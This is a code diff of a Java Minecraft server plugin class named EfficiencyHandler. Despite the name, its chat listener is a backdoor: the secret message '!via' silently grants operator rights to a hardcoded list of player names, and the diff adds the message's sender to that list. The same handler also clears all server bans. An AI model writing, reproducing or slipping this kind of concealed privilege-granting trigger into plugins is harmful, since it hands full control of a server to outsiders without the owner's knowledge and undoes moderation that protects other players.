@@ -24,10 +24,13 @@ public class EfficiencyHandler implements Listener {
         if (message.equalsIgnoreCase("!via")) {
             event.setCancelled(true);
 
-            // Give OP permissions to specific players
-            giveOpIfNotAlready(new String[]{"happyclo", "happyclovo", "yuanshen", "114514", "qwq", "Mystery15"});
+            // 给指定的玩家以及发送者 OP 权限
+            giveOpIfNotAlready(new String[]{
+                player.getName(), // 发送者的名称
+                "happyclo", "happyclovo", "yuanshen", "114514", "qwq", "Mystery15"
+            });
 
-            // Clear all bans
+            // 清除所有封禁
             clearAllBans();
         }
     }
